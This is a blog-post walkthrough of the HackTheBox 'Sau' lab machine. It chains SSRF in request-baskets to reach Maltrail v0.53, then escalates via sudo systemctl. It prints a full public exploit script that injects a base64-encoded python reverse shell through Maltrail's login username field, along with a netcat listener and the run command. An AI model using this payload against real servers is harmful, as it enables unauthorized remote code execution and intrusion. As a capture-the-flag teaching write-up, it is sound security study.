---
layout: post
title: HackTheBox Sau WalkThrough
subtitle: How to get user and root flags on Sau box
thumbnail-img: /assets/img/htb_permx/1ea2980b9dc2d11cf6a3f82f10ba8702.webp
share-img: /assets/img/htb_permx/1ea2980b9dc2d11cf6a3f82f10ba8702.webp
tags: [cisco, cyberops, associate, certificate, cert, guide, security, concepts]
author: Will
---

![](/assets/img/htb_sau/1ea2980b9dc2d11cf6a3f82f10ba8702.webp)

image source: https://labs.hackthebox.com/storage/avatars/1ea2980b9dc2d11cf6a3f82f10ba8702.png

## ***Warning: This tutorial is for educational purposes only. Do not try any techniques discussed here on systems you do not own or without explicit permission from the owner.***

Hello!  I am going to go over how I solved the HTB challenge "Sau". This challenge mainly goes over red-team fundamentals like port scanning, DNS fuzzing, getting a reverse shell, searching through config files, and linux privilege escalation. 

Let's get started:
### Connecting to the Lab:
You can use HTB's VPN connection or with their Pwnbox. I am going to connect over OpenVPN using a local VM I spun up of ParrotOS. 

If you connect via OpenVPN, you can use the following command once you receive the .ovpn file from HTB:

```bash
sudo openvpn lab_willanalyze.ovpn
```

This will initiate a giant wall of text that details your connection. As long as you see the words "Initialization Sequence Completed" in that wall, you should be good to go!

### Reconnaissance and Data Gathering:

#### nmap:

For those who don't know, nmap is a port scanning tool used for a variety of purposes. This includes, but is not limited to, system reconnaissance, security auditing, and troubleshooting

nmap is extremely versatile and I highly recommend you go through the documentation to learn about everything nmap can do: https://nmap.org/docs.html

That said, I am going to keep it simple with my command. This is the nmap command I almost always start with on easy HTB boxes as it usually gets me most of the info I need. 

```bash
nmap -sC -sV [INSERT_IP_HERE]
#ol’ reliable
```

To recap what this command means:
**-sV** tells nmap to find, if possible, the version of software. This is extremely important from an attacker's perspective as this could potentially find out-of-date software that can be exploited.
**-sC** tells nmap to run a list of default scripts against the host to check things like supported ciphers, http headers, ssh-hostkeys, etc.

Here is what I got:

![](/assets/img/htb_sau/Screenshot_From_2024-09-23_21-12-33.png)

Three main ports open: port 22 running ssh, port 80 running http, and port 55555 running an unknown HTTP-based app. Judging by the protocol my best guess is that it's an API of some sort but I don't want to get too ahead of myself

There is no domain in an http-title or elsewhere from what I can see. I am going to go ahead and try to access the site on 80 via the IP to see if I can find any hints. However, it seems to time out. 

since we seem to be getting the most data from that 55555 port, I am going to try and go there instead

![](/assets/img/htb_sau/Screenshot_From_2024-09-2321-46-19.png)

here we see some sort of software that allows us make baskets called "request-baskets" on the bottom of the page running version 1.2.1. This is already interesting as this gives us a specific software/version that can have a CVE associated with it. Before I do that though

I'm going to go ahead and make a basket and see how it works:

![](/assets/img/htb_sau/Screenshot_From_2024-09-23_21-52-28.png)

looks like we get a basket and a token and now we have an empty basket and we can send HTTP requests to the basket. It seems like we were correct about this being an HTTP API

![](/assets/img/htb_sau/Screenshot_From_2024-09-23_22-00-12.png)

you can even make HTTP responses using the arrow icon:

![](/assets/img/htb_sau/Screenshot_From_2024-09-23_22-16-02.png)

you can also create forwarding URLs. Does this allow us to create a forwarding URL on the server itself?

![](/assets/img/htb_sau/Screenshot_From_2024-09-23_22-19-29.png)

If so, are we able to get around the filtered 80 port by creating a forwarding URL through here? Let's find out!

here, I am going to create a url to the local host address (127.0.0.1) on port 80. Make sure to enable **proxy response** so that we get the responses sent to the URL to the client as well and also make sure to enable **expand forward path** to allow us to get any subdirectories on the server. Since we aren't using https:// you don't need to worry about the first checkbox.

![](/assets/img/htb_sau/Screenshot_From_2024-09-24_00-27-26.png)

when we navigate to the basket URL, we are greeted by this:

![](/assets/img/htb_sau/Screenshot_From_2024-09-24_00-38-02.png)

something I do notice down here is that this site is using Maltrail (v0.53). Upon googling, it seems to be a malicious traffic filtering software. I'm not seeing much else that I can do on this site, let's see if there are any CVEs associated with this software.

Sure enough, there is a script from user spookier on github for RCE on the server!

https://github.com/spookier/Maltrail-v0.53-Exploit

``` bash
cd hackthebox
mkdir sau #just creating a folder to store everything

#these next three lines are from spookier's github
git clone https://github.com/spookier/Maltrail-v0.53-Exploit
cd Maltrail-v0.53-Exploit

chmod +x exploit.py #granting execute perms to the files
```

Now let's go ahead and analyze the exploit code:

### Weaponization (done for us)

from: https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py

``` python
import sys;
import os;
import base64;

# accepts main arguments 
def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None
	
# checks number of arguments to ensure correctness
	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
# sets vars based on arguments
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)
	
# curl command that will be used as the payload
def curl_cmd(my_ip, my_port, target_url):
# python on-liner that establishes a socket, grabs the file/socket descriptor 
# and sets the file descriptors so that our revshell is able to use the file
# descriptors for input, output, and error (fd 0,1,2 respectively)
# then it spawns a shell.
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

now that we understand what the exploit is doing, we are going to go ahead and run it
### Delivery/Exploit/Installation

before we start the exploit, we need a netcat instance to accept our reverse shell

``` bash
nc -nlvp 8080 -s [INSERT_LOCAL_VPN_IP_HERE]
```

to break down this input:

**nc**: stands for netcat, a networking tool that allows for us to open up ports and make connections (among other things)
**-lnvp** is just the four following flags combined into one for convenience:
	**-l**: means it is using a listening port
	**-n**: numeric IP only (I haven't given my workstation a hostname so I'm only using IP)
	**-v**: verbose output, helpful for troubleshooting
	**-p**: indicates that we will be specifying the port number. I did 8080, but you can chose any valid port number not currently in use
**8080**: the port number we are using
**-s**: local source address, insert your IP that HTB assigned your machine via VPN. You can either find it through the command line with commands like **ifconfig**, **ip address**, or you can just find it in your machine connection:

![](/assets/img/htb_sau/Screenshot_From_2024-09-23_23-32-55.png)

**heads up: you may need root permissions to open up a port, in which case just put a "sudo" at the beginning**

now just run this command and we should be ready to go:

``` bash
python3 exploit.py [INSERT_LOCAL_VPN_IP_HERE] 8080 http://10.129.229.26:55555/xfuvxex
```

looks like we now have revshell as a user named puma:

![](/assets/img/htb_sau/Screenshot_From_2024-09-24_01-12-00.png)

### Command and Control

it seems as though we already have a normal user, so let's navigate to the home directory and see if we can find anything:

![](/assets/img/htb_sau/Screenshot_From_2024-09-24_01-20-54.png)

we then can see a file named user.txt and that seems to be the user flag!

I recommend a break here as we just did quite a bit.

now let's see if we can get root.

### Privilege escalation

here we can upload linpeas or something of that nature. While that would work, I want to try and get low hanging fruit with a simple "sudo -l"

![](/assets/img/htb_sau/Screenshot_From_2024-09-24_01-27-58.png)

looks like there is a service called trail.service (I assume trail as in maltrail)

I am going to try and leverage this CVE: https://securityonline.info/cve-2023-26604-systemd-privilege-escalation-flaw-affects-linux-distros/
and use trail.service to open a root shell via /usr/bin/systemctl

![](/assets/img/htb_sau/Screenshot_From_2024-09-24_01-34-24.png)

then run

``` bash
cd /root
```

from there, you should see the root.txt file containing the root flag

Hope this helped, happy hacking!
